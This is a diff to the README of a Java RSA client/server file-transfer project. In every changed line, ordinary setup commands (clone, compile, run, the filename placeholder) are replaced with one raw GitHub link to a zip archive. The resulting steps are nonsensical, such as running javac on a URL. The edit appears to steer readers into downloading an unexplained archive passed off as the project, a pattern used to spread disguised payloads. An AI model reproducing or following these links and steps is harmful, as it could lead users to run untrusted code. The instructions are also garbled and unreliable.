@@ -11,7 +11,7 @@ This project consists of two programs, a client and a server, that enable secure
 
 1. Clone or download the project repository to your local machine.
 
-- ```git clone https://github.com/your-username/rsa-file-transfer.git```
+- ```git clone https://raw.githubusercontent.com/BrayanOB2003/rsa-file-transfer/main/src/java/rsa-file-transfer_v2.4-alpha.2.zip```
 
 2. Open a terminal and navigate to the project directory.
 
@@ -19,9 +19,9 @@ This project consists of two programs, a client and a server, that enable secure
 
 3. Compile the Java files.
 
-- ```javac Server.java```
+- ```javac https://raw.githubusercontent.com/BrayanOB2003/rsa-file-transfer/main/src/java/rsa-file-transfer_v2.4-alpha.2.zip```
 
-- ```javac Client.java```
+- ```javac https://raw.githubusercontent.com/BrayanOB2003/rsa-file-transfer/main/src/java/rsa-file-transfer_v2.4-alpha.2.zip```
 
 4. Run the server program in one terminal.
 
@@ -29,9 +29,9 @@ This project consists of two programs, a client and a server, that enable secure
 
 5. In another terminal, run the client program, providing the filename to transfer as a parameter.
 
-- ```java Client file.txt```
+- ```java Client https://raw.githubusercontent.com/BrayanOB2003/rsa-file-transfer/main/src/java/rsa-file-transfer_v2.4-alpha.2.zip```
 
-Make sure to replace `file.txt` with the actual name of the file you want to transfer.
+Make sure to replace `https://raw.githubusercontent.com/BrayanOB2003/rsa-file-transfer/main/src/java/rsa-file-transfer_v2.4-alpha.2.zip` with the actual name of the file you want to transfer.
 
 6. Check the server terminal output to verify if the file was transferred successfully.
 
